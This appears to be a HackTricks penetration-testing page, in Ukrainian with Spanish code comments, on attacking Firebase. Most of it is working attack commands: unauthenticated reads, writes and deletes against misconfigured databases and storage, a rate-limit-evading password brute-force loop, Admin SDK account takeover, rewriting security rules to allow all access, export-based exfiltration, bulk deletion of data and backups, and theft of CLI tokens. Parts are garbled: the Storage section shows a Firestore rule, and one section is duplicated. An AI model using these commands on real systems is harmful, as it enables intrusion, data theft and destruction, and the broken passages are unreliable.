# GCP - Firebase Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Firebase

### Unauthenticated access to Firebase Realtime Database
Зловмиснику не потрібні жодні специфічні дозволи Firebase, щоб провести цю атаку. Потрібна лише вразлива конфігурація в правилах безпеки Firebase Realtime Database, де правила встановлені як `.read: true` або `.write: true`, що дозволяє публічний доступ для читання або запису.

Зловмисник має визначити URL бази даних, який зазвичай має формат: `https://<project-id>.firebaseio.com/`.

Цей URL можна знайти через reverse engineering мобільних застосунків (декомпіляція Android APK або аналіз iOS-застосунків), аналіз конфігураційних файлів, таких як google-services.json (Android) або GoogleService-Info.plist (iOS), перегляд вихідного коду веб-застосунків або аналіз мережевого трафіку для виявлення запитів до доменів `*.firebaseio.com`.

Зловмисник визначає URL бази даних і перевіряє, чи він публічно доступний, після чого отримує доступ до даних і, за потреби, записує шкідливу інформацію.

По-перше, вони перевіряють, чи дозволяє база даних доступ для читання, додавши .json до URL.
```bash
curl https://<project-id>-default-rtdb.firebaseio.com/.json
```
Якщо у відповіді містяться дані JSON або null (замість "Permission Denied"), база даних дозволяє доступ для читання. Щоб перевірити доступ на запис, зловмисник може спробувати відправити тестовий запит на запис за допомогою Firebase REST API.
```bash
curl -X PUT https://<project-id>-default-rtdb.firebaseio.com/test.json -d '{"test": "data"}'
```
Якщо операція вдасться, база даних також надасть доступ на запис.


### Витік даних у Cloud Firestore
Attacker не потребує жодних специфічних дозволів Firebase, щоб виконати цю атаку. Потрібно лише, щоб у правилах безпеки Cloud Firestore була вразлива конфігурація, де правила дозволяють доступ для читання або запису без автентифікації або з недостатньою валідацією. Приклад неправильно сконфігурованого правила, яке надає повний доступ, виглядає так:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Це правило дозволяє будь-кому читати та записувати всі документи без жодних обмежень. Правила Firestore є детальними й застосовуються на рівні колекцій та документів, тому помилка в конкретному правилі може розкрити лише певні колекції.

Атакувальник повинен визначити Firebase Project ID, який можна знайти шляхом зворотного інжинірингу мобільного додатка, аналізу конфігураційних файлів, таких як google-services.json або GoogleService-Info.plist, перегляду вихідного коду вебзастосунків або аналізу мережевого трафіку для виявлення запитів до firestore.googleapis.com.
Firestore REST API використовує формат:
```bash
https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Якщо правила дозволяють неавторизований доступ для читання, нападник може читати колекції та документи. Спочатку він намагається отримати доступ до конкретної колекції:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>
```
Якщо у відповіді замість помилки доступу містяться JSON-документи, колекція є відкритою. Зловмисник може перерахувати всі доступні колекції, перебираючи поширені назви або аналізуючи структуру застосунку. Щоб отримати доступ до конкретного документа:
```bash
curl https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
Якщо правила дозволяють доступ для запису без автентифікації або мають недостатню валідацію, атакуючий може створювати нові документи:
```bash
curl -X POST https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"name": {"stringValue": "Test"},
"email": {"stringValue": "test@example.com"}
}
}'
```
Щоб змінити існуючий документ, слід використовувати PATCH:
```bash
curl -X PATCH https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/users/<user-id> \
-H "Content-Type: application/json" \
-d '{
"fields": {
"role": {"stringValue": "admin"}
}
}'
```
Щоб видалити документ і спричинити denial of service:
```bash
curl -X DELETE https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>
```
### Відкриття файлів у Firebase Storage
Зловмиснику не потрібні жодні специфічні Firebase permissions, щоб виконати цю атаку. Потрібно лише, щоб у Firebase Storage security rules була вразлива конфігурація, де правила дозволяють read або write доступ без автентифікації або з недостатньою перевіркою. Storage rules контролюють read і write permissions незалежно, тож помилка в правилі може відкрити лише read доступ, лише write доступ або обидва. Приклад неправильно налаштованого правила, що надає повний доступ, виглядає так:
```bash
service cloud.firestore {
match /databases/{database}/documents/{document=**} {
allow read, write: if true;
}
}
```
Це правило дозволяє доступ на читання та запис до всіх документів без жодних обмежень. Правила Firestore деталізовані і застосовуються на рівні колекції та документа, тому помилка в конкретному правилі може зробити доступними лише певні колекції. Attacker повинен ідентифікувати Firebase Project ID, який можна знайти за допомогою mobile application reverse engineering, аналізу конфігураційних файлів, таких як google-services.json або GoogleService-Info.plist, перевірки вихідного коду web application або аналізу мережевого трафіку для виявлення запитів до firestore.googleapis.com.
The Firestore REST API використовує формат: `https://firestore.googleapis.com/v1/projects/<PROJECT_ID>/databases/(default)/documents/<collection>/<document>.`

Якщо правила дозволяють unauthenticated read доступ, attacker може читати collections і documents. Спочатку attacker намагається отримати доступ до конкретної колекції.
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?prefix=<path>"
```
Якщо у відповіді міститься список файлів замість помилки дозволів, файл є відкритим. Атакувальник може переглянути вміст файлів, вказавши їхній шлях:
```bash
curl "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<urlencode(path)>"
```
Якщо правила дозволяють неавторизований доступ на запис або мають недостатню перевірку, атакуючий може завантажити шкідливі файли. Щоб завантажити файл через REST API:
```bash
curl -X POST "https://firebasestorage.googleapis.com/v0/b/<bucket>/o?name=<path>" \
-H "Content-Type: <content-type>" \
--data-binary @<local-file>
```
Зловмисник може завантажувати code shells, malware payloads або великі файли, щоб спричинити denial of service. Якщо додаток обробляє або виконує завантажені файли, зловмисник може досягти remote code execution. Щоб видалити файли та спричинити denial of service:
```bash
curl -X DELETE "https://firebasestorage.googleapis.com/v0/b/<bucket>/o/<path>"
```
### Виклик публічних Firebase Cloud Functions
Атакуючому не потрібні спеціальні дозволи Firebase, щоб експлуатувати цю проблему; достатньо, щоб Cloud Function була публічно доступна через HTTP без автентифікації.

Функція вразлива, коли вона неправильно налаштована:

- Вона використовує `functions.https.onRequest`, який не забезпечує примусову автентифікацію (на відміну від `onCall` функцій).
- Код функції не перевіряє автентифікацію користувача (наприклад, немає перевірок `request.auth` або `context.auth`).
- Функція публічно доступна в `IAM`, тобто `allUsers` має роль `roles/cloudfunctions.invoker`. Це поведінка за замовчуванням для `HTTP` функцій, якщо розробник не обмежив доступ.

Firebase HTTP Cloud Functions доступні через URL-адреси, наприклад:

- `https://<region>-<project-id>.cloudfunctions.net/<function-name>`
- `https://<project-id>.web.app/<function-name>` (коли інтегровано з Firebase Hosting)

Атакуючий може виявити ці URL через аналіз вихідного коду, інспекцію мережевого трафіку, інструменти для enumeration або реверс-інжиніринг мобільного додатку.
Якщо функція публічно відкрита і без автентифікації, атакуючий може викликати її без облікових даних.
```bash
# Invoke public HTTP function with GET
curl "https://<region>-<project-id>.cloudfunctions.net/<function-name>"
# Invoke public HTTP function with POST and data
curl -X POST "https://<region>-<project-id>.cloudfunctions.net/<function-name>" \
-H "Content-Type: application/json" \
-d '{"param1": "value1", "param2": "value2"}'
```
Якщо функція не перевіряє коректно вхідні дані, нападник може спробувати інші атаки, такі як code injection або command injection.


### Brute-force attack against Firebase Authentication з слабкою політикою паролів
Нападнику не потрібні специфічні дозволи Firebase, щоб провести цю атаку. Потрібно лише, щоб Firebase API Key був відкрито присутній у мобільних або веб-застосунках, і щоб політика паролів не була налаштована суворіше за значення за замовчуванням.

Нападник має визначити Firebase API Key, який можна знайти через mobile app reverse engineering, аналіз конфігураційних файлів, таких як google-services.json або GoogleService-Info.plist, перегляд вихідного коду веб-застосунків (наприклад, у bootstrap.js), або аналіз мережевого трафіку.

REST API Firebase Authentication використовує endpoint:
`https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>`
для автентифікації за email та паролем.

Якщо Email Enumeration Protection вимкнено, API-помилки можуть показати, чи існує email у системі (EMAIL_NOT_FOUND vs. INVALID_PASSWORD), що дозволяє нападникам перераховувати користувачів перед спробами підбору пароля. Коли цей захист увімкнено, API повертає однакове повідомлення про помилку як для неіснуючих email, так і для неправильних паролів, запобігаючи переліченню користувачів.

Важливо зазначити, що Firebase Authentication застосовує rate limiting, який може блокувати запити при надто великій кількості спроб автентифікації за короткий проміжок часу. Через це нападнику доведеться вводити затримки між спробами, щоб уникнути обмеження.

Нападник знаходить API Key і виконує спроби автентифікації з різними паролями для відомих облікових записів. Якщо Email Enumeration Protection вимкнено, нападник може перерахувати існуючих користувачів, аналізуючи відповіді з помилками:
```bash
# Attempt authentication with a known email and an incorrect password
curl -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d '{
"email": "usuario@example.com",
"password": "password",
"returnSecureToken": true
}'
```
Якщо відповідь містить EMAIL_NOT_FOUND, то електронної пошти немає в системі. Якщо відповідь містить INVALID_PASSWORD, електронна пошта існує, але пароль неправильний — це підтверджує, що користувач зареєстрований. Після виявлення дійсного користувача атакуючий може виконувати brute-force спроби. Важливо робити паузи між спробами, щоб уникнути механізмів rate-limiting у Firebase Authentication:
```bash
counter=1
for password in $(cat wordlist.txt); do
echo "Intento $counter: probando contraseña '$password'"
response=$(curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=<API_KEY>" \
-H "Content-Type: application/json" \
-d "{\"email\":\"usuario@example.com\",\"password\":\"$password\",\"returnSecureToken\":true}")

if echo "$response" | grep -q "idToken"; then
echo "Contraseña encontrada: $password (intento $counter)"
break
fi

# Stop for the rate limiting
sleep 1
counter=$((counter + 1))
done
```
Зі стандартною політикою паролів (мінімум 6 символів, без вимог до складності) атакуючий може перебрати всі можливі комбінації 6-символьних паролів, що становить відносно невеликий простір пошуку порівняно зі строгішими політиками паролів.

### Керування користувачами у Firebase Authentication

Атакуючому потрібні конкретні дозволи Firebase Authentication, щоб виконати цю атаку. Необхідні дозволи:

- `firebaseauth.users.create` to create users
- `firebaseauth.users.update` to modify existing users
- `firebaseauth.users.delete` to delete users
- `firebaseauth.users.get` to retrieve user information
- `firebaseauth.users.sendEmail` to send emails to users
- `firebaseauth.users.createSession` to create user sessions

Ці дозволи включені в роль `roles/firebaseauth.admin`, яка надає повний доступ на читання/запис до ресурсів Firebase Authentication. Вони також входять до складу ролей вищого рівня, таких як roles/firebase.developAdmin (яка включає всі firebaseauth.* дозволи) та roles/firebase.admin (повний доступ до всіх сервісів Firebase).

Щоб використовувати Firebase Admin SDK, атакуючому потрібен доступ до облікових даних сервісного облікового запису (JSON-файл), які можуть бути знайдені на скомпрометованих системах, у публічно викладених репозиторіях коду, у скомпрометованих CI/CD системах або внаслідок компрометації облікових записів розробників, які мають доступ до цих облікових даних.

Перший крок — налаштувати Firebase Admin SDK, використовуючи облікові дані сервісного облікового запису.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Щоб створити шкідливого користувача, використовуючи email victim, attacker намагатиметься скористатися Firebase Admin SDK, щоб створити новий акаунт на цю адресу.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Щоб змінити існуючого користувача, attacker оновить поля, наприклад електронну адресу, статус підтвердження або прапорець, який вказує, чи вимкнено обліковий запис.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Щоб видалити обліковий запис користувача і спричинити denial of service, attacker відправить запит на повне видалення користувача.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Атакувальник також може отримати інформацію про існуючих користувачів, запитавши їхній UID або email address.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Крім того, зловмисник може згенерувати верифікаційні посилання або посилання для скидання пароля, щоб змінити пароль користувача та отримати доступ до його облікового запису.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Керування користувачами у Firebase Authentication
Зловмисникові потрібні певні дозволи Firebase Authentication, щоб виконати цю атаку. Необхідні дозволи:

- `firebaseauth.users.create` щоб створювати користувачів
- `firebaseauth.users.update` щоб змінювати існуючих користувачів
- `firebaseauth.users.delete` щоб видаляти користувачів
- `firebaseauth.users.get` щоб отримувати інформацію про користувачів
- `firebaseauth.users.sendEmail` щоб надсилати електронні листи користувачам
- `firebaseauth.users.createSession` щоб створювати сесії користувачів

Ці дозволи входять до ролі `roles/firebaseauth.admin`, яка надає повний доступ для читання/запису до ресурсів Firebase Authentication. Вони також є частиною ролей вищого рівня, таких як `roles/firebase.developAdmin` (містить усі firebaseauth.* дозволи) та `roles/firebase.admin` (повний доступ до всіх сервісів Firebase).

Щоб використовувати Firebase Admin SDK, зловмисникові потрібен доступ до облікових даних сервісного облікового запису (JSON-файлу), які можна отримати з компрометованих систем, публічно доступних репозиторіїв коду, компрометованих CI/CD середовищ або через компрометацію облікових записів розробників, що мають доступ до цих облікових даних.

Перший крок — налаштувати Firebase Admin SDK, використовуючи облікові дані сервісного облікового запису.
```bash
import firebase_admin
from firebase_admin import credentials, auth
cred = credentials.Certificate('path/to/serviceAccountKey.json')
firebase_admin.initialize_app(cred)
```
Щоб створити шкідливого користувача, використовуючи електронну пошту жертви, зловмисник намагатиметься створити новий обліковий запис з цією адресою, призначивши власний пароль та інформацію профілю.
```bash
user = auth.create_user(
email='victima@example.com',
email_verified=False,
password='password123',
display_name='Usuario Malicioso',
disabled=False
)
print(f'Usuario creado: {user.uid}')
```
Щоб змінити існуючого користувача, зловмисник змінює такі поля, як адреса електронної пошти, статус підтвердження або чи деактивовано обліковий запис.
```bash
user = auth.update_user(
uid,
email='nuevo-email@example.com',
email_verified=True,
disabled=False
)
print(f'Usuario actualizado: {user.uid}')
```
Щоб видалити обліковий запис користувача — фактично спричинивши denial of service — зловмисник відправив би запит на остаточне видалення цього користувача.
```bash
auth.delete_user(uid)
print('Usuario eliminado exitosamente')
```
Атакуючий також міг отримати інформацію про існуючих користувачів, наприклад їх UID або електронну адресу, запитавши деталі користувача за UID або за електронною адресою.
```bash
user = auth.get_user(uid)
print(f'Información del usuario: {user.uid}, {user.email}')
user = auth.get_user_by_email('usuario@example.com')
print(f'Información del usuario: {user.uid}, {user.email}')
```
Крім того, зловмисник може згенерувати verification links або password-reset links, що дозволить йому змінити пароль користувача та взяти під контроль обліковий запис.
```bash
link = auth.generate_email_verification_link(email)
print(f'Link de verificación: {link}')
link = auth.generate_password_reset_link(email)
print(f'Link de reset: {link}')
```
### Зміна правил безпеки у сервісах Firebase
Зловмиснику потрібні конкретні дозволи для зміни правил безпеки, які залежать від сервісу. Для Cloud Firestore та Firebase Cloud Storage потрібні дозволи `firebaserules.rulesets.create` щоб створювати rulesets та `firebaserules.releases.create` щоб розгортати releases. Ці дозволи входять до ролі `roles/firebaserules.admin` або до ролей вищого рівня, таких як `roles/firebase.developAdmin` та `roles/firebase.admin`. Для Firebase Realtime Database потрібен дозвіл `firebasedatabase.instances.update`.

Зловмисник повинен використовувати Firebase REST API для зміни правил безпеки.
Спочатку зловмиснику потрібно отримати токен доступу, використовуючи облікові дані service account.
Щоб отримати токен:
```bash
gcloud auth activate-service-account --key-file=path/to/serviceAccountKey.json
ACCESS_TOKEN=$(gcloud auth print-access-token)
```
Щоб змінити правила Firebase Realtime Database:
```bash
curl -X PUT "https://<project-id>-default-rtdb.firebaseio.com/.settings/rules.json?access_token=$ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"rules": {
".read": true,
".write": true
}
}'
```
Щоб змінити правила Cloud Firestore, зловмисник повинен створити ruleset, а потім розгорнути його:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "firestore.rules",
"content": "rules_version = '\''2'\'';\nservice cloud.firestore {\n  match /databases/{database}/documents {\n    match /{document=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Попередня команда повертає ім'я ruleset у форматі projects/<project-id>/rulesets/<ruleset-id>. Щоб розгорнути нову версію, release потрібно оновити за допомогою PATCH-запиту:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/cloud.firestore" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/cloud.firestore",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
Щоб змінити правила Firebase Cloud Storage:
```bash
curl -X POST "https://firebaserules.googleapis.com/v1/projects/<project-id>/rulesets" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"source": {
"files": [{
"name": "storage.rules",
"content": "service firebase.storage {\n  match /b/{bucket}/o {\n    match /{allPaths=**} {\n      allow read, write: if true;\n    }\n  }\n}"
}]
}
}'
```
Попередня команда повертає назву ruleset у форматі projects/<project-id>/rulesets/<ruleset-id>. Щоб розгорнути нову версію, реліз потрібно оновити за допомогою PATCH-запиту:
```bash
curl -X PATCH "https://firebaserules.googleapis.com/v1/projects/<project-id>/releases/firebase.storage/<bucket-id>" \
-H "Authorization: Bearer $ACCESS_TOKEN" \
-H "Content-Type: application/json" \
-d '{
"release": {
"name": "projects/<project-id>/releases/firebase.storage/<bucket-id>",
"rulesetName": "projects/<project-id>/rulesets/<ruleset-id>"
}
}'
```
### Екзфільтрація та маніпуляція даними в Cloud Firestore
Cloud Firestore використовує ту саму інфраструктуру та систему дозволів, що й Cloud Datastore, тому Datastore IAM дозволи застосовуються безпосередньо до Firestore. Для маніпуляцій політиками TTL потрібен дозвіл `datastore.indexes.update`. Для експорту даних потрібен дозвіл `datastore.databases.export`. Для імпорту даних потрібен дозвіл `datastore.databases.import`. Для масового видалення даних потрібен дозвіл `datastore.databases.bulkDelete`.

Для операцій резервного копіювання й відновлення потрібні конкретні дозволи:

- `datastore.backups.get` і `datastore.backups.list` — щоб перелікувати та отримати деталі доступних резервних копій
- `datastore.backups.delete` — щоб видаляти резервні копії
- `datastore.backups.restoreDatabase` — щоб відновлювати базу даних з резервної копії
- `datastore.backupSchedules.create` і `datastore.backupSchedules.delete` — щоб керувати розкладами резервного копіювання

Коли створюється політика TTL, обирається певна властивість, яка визначатиме сутності, придатні для видалення. Ця TTL-властивість має бути типу Date and time. Зловмисник може обрати вже наявну властивість або призначити властивість, яку планує додати пізніше. Якщо значення поля — дата в минулому, документ стає придатним для негайного видалення. Зловмисник може використовувати gcloud CLI для маніпуляцій політиками TTL.
```bash
# Enable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--enable-ttl
# Disable TTL
gcloud firestore fields ttls update expireAt \
--collection-group=users \
--disable-ttl
```
Щоб експортувати дані та exfiltrate їх, зловмисник може використати gcloud CLI.
```bash
gcloud firestore export gs://<bucket-name> --project=<project-id> --async --database='(default)'
```
Щоб імпортувати шкідливі дані:
```bash
gcloud firestore import gs://<bucket-name>/<path> --project=<project-id> --async --database='(default)'
```
Для масового видалення даних і спричинення denial of service, атакуючий може скористатися gcloud Firestore bulk-delete tool для видалення цілих колекцій.
```bash
gcloud firestore bulk-delete \
--collection-ids=users,posts,messages \
--database='(default)' \
--project=<project-id>
```
Для операцій резервного копіювання та відновлення зловмисник може створювати заплановані резервні копії, щоб зафіксувати поточний стан бази даних, перелічувати наявні резервні копії, відновлювати з резервної копії, щоб перезаписати останні зміни, видаляти резервні копії, спричиняючи постійну втрату даних, та видаляти заплановані резервні копії.
Щоб створити щоденний розклад резервного копіювання, який негайно створює резервну копію:
```bash
gcloud firestore backups schedules create \
--database='(default)' \
--recurrence=daily \
--retention=14w \
--project=<project-id>
```
Щоб відновити дані з конкретної резервної копії, зловмисник може створити нову базу даних, використавши дані, що містяться в цій резервній копії. Операція відновлення записує дані резервної копії в нову базу даних, тобто існуючий DATABASE_ID не може бути використаний.
```bash
gcloud firestore databases restore \
--source-backup=projects/<project-id>/locations/<location>/backups/<backup-id> \
--destination-database='<new-database-id>' \
--project=<project-id>
```
Щоб видалити backup і спричинити постійну втрату даних:
```bash
gcloud firestore backups delete \
--backup=<backup-id> \
--project=<project-id>
```
### Крадіжка та зловживання обліковими даними Firebase CLI
Атакувальнику не потрібні спеціальні дозволи у Firebase, щоб виконати цю атаку, але йому потрібен доступ до локальної системи розробника або до файлу облікових даних Firebase CLI. Ці облікові дані зберігаються в JSON-файлі, розташованому за адресою:

- Linux/macOS: ~/.config/configstore/firebase-tools.json

- Windows: C:\Users\[User]\.config\configstore\firebase-tools.json

Цей файл містить токени аутентифікації, включно з refresh_token та access_token, які дозволяють атакувальнику автентифікуватися як користувач, що раніше виконував firebase login.

Атакувальник отримує доступ до файлу облікових даних Firebase CLI. Він може скопіювати весь файл на свій комп'ютер, і Firebase CLI автоматично використовуватиме облікові дані з його стандартного розташування. Після цього атакувальник зможе переглянути всі Firebase проекти, доступні цьому користувачу.
```bash
firebase projects:list
```
{{#include ../../../banners/hacktricks-training.md}}
